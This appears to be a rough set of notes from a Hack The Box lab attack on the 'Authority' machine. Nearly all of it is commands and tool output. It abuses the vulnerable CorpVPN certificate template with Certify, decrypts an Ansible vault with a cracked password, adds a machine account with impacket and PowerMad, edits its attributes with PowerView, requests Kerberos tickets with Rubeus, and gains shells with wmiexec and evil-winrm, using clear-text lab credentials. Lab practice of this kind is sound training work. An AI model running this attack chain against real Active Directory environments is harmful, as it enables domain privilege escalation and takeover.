+./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /onbehalfof:htb\PC03$ /enrollcert:C:\Users\svc_ldap\Documents\enroll.pfx  /altname:localadmin
+./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /onbehalfof:HTB\PC03$ /enrollcert:enrollmentcert.pfx /enrollcertpwd:asdf
+[X] A /ca:CA is required! (format SERVER\CA-NAME)
+
+Certify.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]
+
+
+Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
+Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /machine [/subject:X] [/template:Y] [/install]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------
+
+
+└─$ echo '$ANSIBLE_VAULT;1.1;AES256
+36643662303931336362356361373334663632343139383832626130636237333134373034326565
+3736626632306265393565653338356138626433333339310a323832663233316666353764373733
+30613239313731653932323536303537623362653464376365383963373366336335656635666637
+3238313530643164320a336337303734303930303163326235623834383337343363326461653162
+33353861663464313866353330376566346636303334353732383564633263373862' | /home/kali/.local/bin/ansible-vault decrypt && echo
+Vault password: fred
+Decryption successful
+fastfredfedfourfrankfurters
+
+
+impacket-addcomputer -computer-name 'PC00' -computer-pass 'Password@123' -debug -computer-group 'CN=Computers,DC=authority,DC=htb' -k -dc-host authority.authority.htb -dc-ip 10.10.11.222 authority.htb/svc_ldap:'lDaP_1n_th3_cle4r\!'@10.10.11.222
+
+impacket-GetADUsers -dc-ip 10.10.11.222 authority.htb/svc_ldap:lDaP_1n_th3_cle4r\!@10.10.11.222
+crackmapexec winrm 10.10.11.222 -u 'guest' -p 'guest' --local-auth --continue-on-success
+
+impacket-wmiexec -dc-host authority.authority.htb -dc-ip 10.10.11.222 authority.htb/svc_ldap:lDaP_1n_th3_cle4r\!@10.10.11.222
+
+
+---------------------------------------------------------------------------------------------------------------------------
+
+
+* SeMachineAccountPrivilege
+Set-ExecutionPolicy Bypass -Scope process -Force
+Get-ADComputer svc_ldap -Identity (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota ==>> check quota
+
+. ./PowerMad.ps1
+New-MachineAccount -MachineAccount PC03 -Domain authority.htb -DomainController authority.authority.htb -Verbose ==>> faile because passowrd input
+
+$machine_account_password = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
+New-MachineAccount -MachineAccount PC03 -Password $machine_account_password -Domain authority.htb -DomainController authority.authority.htb -Verbose
+Verbose: [+] SAMAccountName = PC03$
+Verbose: [+] Distinguished Name = CN=PC03,CN=Computers,DC=authority,DC=htb
+[+] Machine account PC03 added
+
+
+. ./PowerView.ps1
+Set-DomainObject "CN=PC03,CN=Computers,DC=authority,DC=htb" -Clear 'serviceprincipalname' -Verbose
+
+Verbose: [Get-DomainSearcher] search base: LDAP://DC=authority,DC=htb
+Verbose: [Get-DomainObject] Extracted domain 'authority.htb' from 'CN=PC03,CN=Computers,DC=authority,DC=htb'
+Verbose: [Get-DomainSearcher] search base: LDAP://DC=authority,DC=htb
+Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=PC03,CN=Computers,DC=authority,DC=htb)))
+Verbose: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'PC03$'
+
+
+Get-ADComputer "PC03" -Properties *
+
+Set-MachineAccountAttribute -MachineAccount 'PC03' -Value 'AUTHORITY' -Attribute 'SamAccountName' -Verbose
+
+Verbose: [+] Domain Controller = authority.authority.htb
+Verbose: [+] Domain = authority.htb
+Verbose: [+] Distinguished Name = CN=PC03,CN=Computers,DC=authority,DC=htb
+[-] Exception calling "SetInfo" with "0" argument(s): "A device attached to the system is not functioning.
+"
+
+
+.\Rubeus.exe asktgt /user:svc_ldap /password:lDaP_1n_th3_cle4r! /domain:authority.htb /dc: authority.authority.htb /nowrap /nopac
+
+
+---------------------------------------------------------------------------------------------------------------------------
+
+
+*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ./Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'
+
+[*] Listing info about the Enterprise CA 'AUTHORITY-CA'
+
+    Enterprise CA Name            : AUTHORITY-CA
+    DNS Hostname                  : authority.authority.htb
+    FullName                      : authority.authority.htb\AUTHORITY-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
+    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Cert Start Date               : 4/23/2023 9:46:26 PM
+    Cert End Date                 : 4/23/2123 9:56:25 PM
+    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : authority.authority.htb\AUTHORITY-CA
+    Template Name                         : CorpVPN
+    Schema Version                        : 2
+    Validity Period                       : 20 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+      Object Control Permissions
+        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+
+
+
+Certify completed in 00:00:10.2864748
+
+
+
+
+
